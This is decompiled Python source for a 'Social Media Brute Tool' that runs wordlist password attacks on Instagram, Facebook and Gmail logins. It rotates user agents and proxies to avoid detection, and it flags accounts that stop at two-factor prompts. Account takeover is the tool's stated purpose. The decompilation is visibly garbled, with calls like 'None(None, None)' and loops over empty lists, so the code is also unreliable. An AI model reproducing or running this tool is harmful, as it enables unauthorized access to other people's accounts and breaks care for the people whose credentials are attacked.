# Source Generated with ShoaibxAmer Pycdc
# File: social.pyc (Python 3.12)
# Decoded By: DARK LMNx9 (t.me/x_LMNx9)

from rich.console import Console
import time
import os
import random
import requests
import instaloader
import smtplib
import sys
sys.stdout.write('\x1b[1;35m\x1b]2;[🇧🇩] SOCIAL MEDIA BRUTE TOOL][🇧🇩]\x07')
os.system('clear')
import socket
import sys
import os
import time
from rich.console import Console
from rich.panel import Panel
from rich import print
console = Console()

def check_internet():
    socket.create_connection(('8.8.8.8', 53), timeout = 3)
    return True
    if OSError:
        return False


def check_proxy_file():
    return os.path.isfile('proxy.txt')

console.print(Panel.fit('[bold cyan]🌐 TOOL STARTUP CHECKER[/bold cyan]\n[white]Powered by TEAM BCS[/white]', border_style = 'bright_magenta'))
console.status('[bold yellow]  Checking Internet connection...[/bold yellow]', spinner = 'aesthetic')
time.sleep(3)
if not check_internet():
    console.print('\n[bold red][✘] No Internet Connection! Please connect to internet.[/bold red]\n')
    time.sleep(2)
    sys.exit()
None(None, None)
console.status('[bold yellow] Checking for proxy.txt file...[/bold yellow]', spinner = 'aesthetic')
time.sleep(3)
if not check_proxy_file():
    console.print("\n[bold red][✘] Missing 'proxy.txt' file! Please add it to run the tool.[/bold red]\n")
    time.sleep(2)
    sys.exit()
None(None, None)
console.print('\n[bold green][✓] Internet Connected![/bold green]')
console.print('[bold green][✓] proxy.txt found![/bold green]')
console.print(Panel.fit('[bold green]✅ All checks passed! Starting the tool...[/bold green]', border_style = 'green'))
time.sleep(3)
console.print(Panel.fit('[bold blue]🔧 Tool is now running...[/bold blue]', border_style = 'cyan'))
time.sleep(3)
os.system('clear')
sascii_art = '\n  â•¾â”â•¾â”â•¾â”â•˜â•˜â•¾â”â”ˆ   â•™â•—â”â•›â•™â•˜â”â•˜â•˜â•¾â” â•™â”â•™â”â”ˆ â”ˆâ”â•¾â•˜â•™â•˜â”                                                                                     \n â•šâ–„ â”ˆ â”ˆâ”ˆ  â” â•™â–„â”ˆâ”ˆ   â”ˆâ•˜â”ˆâ•™â–„ â”ˆ â”ˆâ” â•™â–„â”ˆ â•™â–„â”€â•™â–„â”€â”ˆ â”ˆ â”ˆ â”™â–„                                                                                  \nâ–– â”ˆâ”ˆ â”ˆâ”ˆ â––â” â”ˆ â”ˆâ”ˆ   â”ˆ â”ˆâ”ˆ  â”ˆ â”ˆâ” â”ˆ â”ˆ â”ˆ â”ˆâ”ˆâ•š â”ˆ â”ˆ â”ˆ
\n  â”â” â”â” â”â” â”—â•˜â•˜ â•˜â”â” â•˜ â•˜â”â”â”â” â”—â•˜â”ˆ â•˜ â”â” â•˜â” â”ˆ â”ˆâ”  â•˜ â”â”                                                                                  \n                                                                                     \n                                                                                      \n ð‚ð‡ð€ðŽð“ðˆð‚ ð‚ðŽðƒð„ ð“ð„ð€ðŒ ððŽð–ð„ð‘ð„ðƒ ðð˜ ð€ðƒðˆð‘ð“ð“ð€-â“‰, ðð‘ðŽð‰ð„ð‚ð“_â“‰\n'
os.system('clear')
ascii_art = '\n  ▞▀▖▞▀▖▞▀▖▜▘▞▀▖▌   ▙▗▌▛▀▘▛▀▖▜▘▞▀▖ ▛▀▖▛▀▖▌ ▌▀▛▘▛▀▘                                             \n ▚▄ ▌ ▌▌  ▐ ▙▄▌▌   ▌▘▌▙▄ ▌ ▌▐ ▙▄▌ ▙▄▘▙▄▘▌ ▌ ▌ ▙▄                                               \n▖ ▌▌ ▌▌ ▖▐ ▌ ▌▌   ▌ ▌▌  ▌ ▌▐ ▌ ▌ ▌ ▌▌▚ ▌ ▌ ▌ ▌                                                 \n  ▝▀ ▝▀ ▝▀ ▀▘▘ ▘▀▀▘ ▘ ▘▀▀▘▀▀ ▀▘▘ ▘ ▀▀ ▘ ▘▝▀  ▘ ▀▀▘                                             \n\n\n DEVELOPER : 𝚂𝙷𝙾𝙽𝙲𝙷𝙾𝚈𝙾𝙽 𝙱𝙰𝚁𝚄𝙰 𝙰𝙳𝙸𝚁𝚃𝚃𝙰-[𝙼𝟹,𝙷𝟺𝚄𝙽𝟻𝚁_𝟼𝟿]\n OWNER : BANGLADESH CYBER SQUAD\n Version : 1.0\n'
console = Console()
PROXIES = None
vpn_status = False
proxy_list = []

def load_proxies():
    global proxy_list, proxy_list
    if os.path.exists('proxy.txt'):
        file = open('proxy.txt', 'r')
        for line in []:
            if not line.strip():
                pass
            line = file[line.strip()]
            proxy_list = file
            None(None, None)
            return None
            proxy_list = []
            return None
            line = None
            if not None:
                pass


def get_random_proxy():
    if not vpn_status or proxy_list:
        return None
    proxy = random.choice(proxy_list)
    return {
        'http': f'''http://{proxy}''',
        'https': f'''http://{proxy}''' }


def xxp():
    if vpn_status:
        console.print('[green][VPN] Status: ON[/green]', justify = 'center')
        return None
    console.print('[red][VPN] Status: OFF[/red]', justify = 'center')


def ask_vpn_status():
    global vpn_status
    user_input = input(' \x1b[93m[?] Do you want to enable VPN Proxy System? (y/n):\x1b[92m ').lower()
    vpn_status = user_input == 'y'
    load_proxies()
    get_random_proxy()
    xxp()


def vpn():
    if vpn_status:
        console.print('[green][VPN] Status: ON[/green]', justify = 'center')
        return None
    console.print('[red][VPN] Status: OFF[/red]', justify = 'center')

for v in []:
    v = range(7, 16)[f'''Mozilla/5.0 (Linux; Android {v}; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36''']
    ANDROID_UA = range(7, 16)
    PC_UA = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36']
    ALL_UA = ANDROID_UA + PC_UA
    INSTAGRAM_URL = 'https://www.instagram.com/accounts/login/?hl=en'
    FACEBOOK_URL = 'https://www.facebook.com/login.php'
    GMAIL_SMTP = ('smtp.gmail.com', 587)

    def start():
        console.print(ascii_art, justify = 'center', style = '#B0DAFF bold')
        for n in []:
            tasks = range(1, 2000)[f'''task {n}''']
            n = range(1, 2000)
            console.print('', justify = 'center', end = '')
            status = console.status('[bold purple]Loading[/bold purple]', spinner = 'arc', spinner_style = 'bold cyan')
            if tasks:
                console.print('', justify = 'center', end = '')
                task = tasks.pop(0)
                time.sleep(0.001)
                if tasks:
                    pass
        None(None, None)
        return None
        n = None
        if not None:
            pass


    def get_username():
        console.print('\n[bold green][Use Email, Uid, Username] [bold white]', style = '#B0DAFF')
        return console.input('\n[bold green] [Enter][bold yellow] ╼⫸ [bold white]')


    def get_email():
        console.print('\n[bold green] [bold white]', style = '#B0DAFF')
        return console.input('\n[bold green] [Enter Email][bold yellow] ╼⫸ [bold white]')

    import os
    import time
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, TextColumn
    console = Console()

    def get_wordlist():
        console.print('\nEnter Wordlist Path (e.g. /sdcard/pass.txt)', justify = 'center', style = '#B0DAFF')
        path = console.input('\n[bold cyan] [Enter File Path][bold yellow] ╼⫸ [bold white] ')
        if not os.path.isfile(path):
            console.print('[red]#= [File not found!] =#[/red]', justify = 'center')
            exit()
        progress = Progress(SpinnerColumn(spinner_name = 'dots', style = 'cyan'), TextColumn(' [bold yellow]Loading passwords...'), transient = True)
        task = progress.add_task('load', total = None)
        time.sleep(1.5)
        file = open(path, 'r', encoding = 'utf-8', errors = 'ignore')
        lines = file.readlines()
        None(None, None)
        progress.remove_task(task)
        None(None, None)
        total = None(len)
        console.print(f'''[green][ Loaded {total} passwords from wordlist File.][/green]''', justify = 'center')
        return path
        if not None:
            pass
        if not None:
            pass


    def insta_brute(username, wordlist):
        f = open(wordlist, 'r', encoding = 'utf-8', errors = 'ignore')
        for line in []:
            passwords = f[line.strip()]
            line = f
            None(None, None)
            L = instaloader.Instaloader()
            if PROXIES:
                L.context._session.proxies = PROXIES
        console.status('[bold green]Trying passwords...[/bold green]', spinner = 'bouncingBar')
        for pw in None:
            L.context._session.headers.update({
                'User-Agent': random.choice(ALL_UA) })
            L.login(username, pw)
            console.print(f'''[green]Password Found: {pw}[/green]''', justify = 'center')
            None(None, None)
            return None
            None(None, None)
            return None
            line = None
            if not None:
                pass
        if Exception:
            e = None
            if 'checkpoint' in str(e).lower():
                console.print(f'''[cyan]2FA Detected: {pw}[/cyan]''', justify = 'center')
                e = None
                del e
                None(None, None)
                return None
            console.print(f'''[bold red]Wrong: {pw}[/bold red]''', justify = 'center')
            e = None
            del e
            e = None
            del e
        if not None:
            pass


    def fb_brute(username, wordlist):
        f = open(wordlist, 'r', encoding = 'utf-8', errors = 'ignore')
        for line in []:
            passwords = f[line.strip()]
            line = f
            None(None, None)
            session = requests.Session()
            if PROXIES:
                session.proxies.update(PROXIES)
        console.status('[bold green]Trying passwords...[/bold green]', spinner = 'bouncingBall')
        for pw in None:
            headers = {
                'User-Agent': random.choice(ALL_UA) }
            data = {
                'email': username,
                'pass': pw }
            r = session.post(FACEBOOK_URL, headers = headers, data = data)
            if 'Find Friends' in r.text or 'home.php' in r.url:
                console.print(f'''[green]Password Found: {pw}[/green]''', justify = 'center')
                None(None, None)
                return None
            if 'two-factor' in r.text or 'security code' in r.text:
                console.print(f'''[cyan]2FA Detected: {pw}[/cyan]''', justify = 'center')
                None(None, None)
                return None
            console.print(f'''[bold red]Wrong: {pw}[/bold red]''', justify = 'center')
            None(None, None)
            return None
            line = None
            if not None:
                pass
        if not None:
            pass


    def gmail_brute(email, wordlist):
        f = open(wordlist, 'r', encoding = 'utf-8', errors = 'ignore')
        for line in []:
            passwords = f[line.strip()]
            line = f
            None(None, None)
            console.status('[bold green]Trying passwords...[/bold green]', spinner = 'aesthetic')
            for pw in None:
                server = GMAIL_SMTP
                server.starttls()
                server.login(email, pw)
                console.print(f'''[green]Password Found: {pw}[/green]''', justify = 'center')
                server.quit()
                smtplib.SMTP
                None(None, None)
                return None
                None(None, None)
                return None
                line = None
                if not None:
                    pass
        if smtplib.SMTPAuthenticationError:
            e = None
            if 'Application-specific password' in str(e):
                console.print(f'''[cyan]2FA Detected: {pw}[/cyan]''', justify = 'center')
                e = None
                del e
                None(None, None)
                return None
            console.print(f'''[bold red]Wrong: {pw}[/bold red]''', justify = 'center')
            e = None
            del e
            e = None
            del e
        console.print(f'''[bold red]Wrong: {pw}[/bold red]''', justify = 'center')
        if not None:
            pass


    def main():
        global PROXIES
        start()
        PROXIES = ask_vpn_status()
        os.system('clear')
        start()
        vpn()
        console.print('\n:: 1 Instagram | 2 Facebook | 3 Gmail ::', justify = 'center', style = '#B0DAFF')
        choice = console.input('\n[bold green] [Select][bold yellow] ╼⫸[bold white] ')
        if choice == '1':
            u = get_username()
            w = get_wordlist()
            insta_brute(u, w)
            return None
        if choice == '2':
            u = get_username()
            w = get_wordlist()
            fb_brute(u, w)
            return None
        if choice == '3':
            e = get_email()
            w = get_wordlist()
            gmail_brute(e, w)
            return None
        console.print('[red]Invalid choice[/red]', justify = 'center')

    if __name__ == '__main__':
        main()
        return None
return None
if not None:
    pass
if not None:
    pass
v = None
